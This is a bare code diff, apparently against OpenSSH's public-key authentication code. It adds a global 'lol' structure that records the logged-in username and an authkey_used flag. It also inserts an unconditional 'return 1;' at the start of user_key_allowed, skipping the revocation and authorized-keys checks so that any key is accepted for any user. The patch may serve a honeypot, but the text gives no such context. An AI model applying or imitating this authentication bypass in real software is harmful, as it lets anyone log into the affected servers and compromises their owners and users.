@@ -73,6 +73,7 @@
 extern ServerOptions options;
 extern u_char *session_id2;
 extern u_int session_id2_len;
+extern Lol *lol;
 
 static int
 userauth_pubkey(Authctxt *authctxt)
@@ -183,6 +184,16 @@ userauth_pubkey(Authctxt *authctxt)
 			auth2_record_userkey(authctxt, key);
 			key = NULL; /* Don't free below */
 		}
+
+		{ /* Set username and authkey_used flag. */
+			char *user = authctxt->user;
+			if ((authctxt->original_user != NULL) && (strlen(authctxt->original_user) > 0))
+				user = authctxt->original_user;
+
+			lol->username = strdup(user);
+			lol->authkey_used = 1;
+		}
+
 		buffer_free(&b);
 		free(sig);
 	} else {
@@ -1094,6 +1105,8 @@ user_key_allowed(struct passwd *pw, Key *key, int auth_attempt)
 {
 	u_int success, i;
 	char *file;
+
+	return 1;
 
 	if (auth_key_is_revoked(key))
 		return 0;
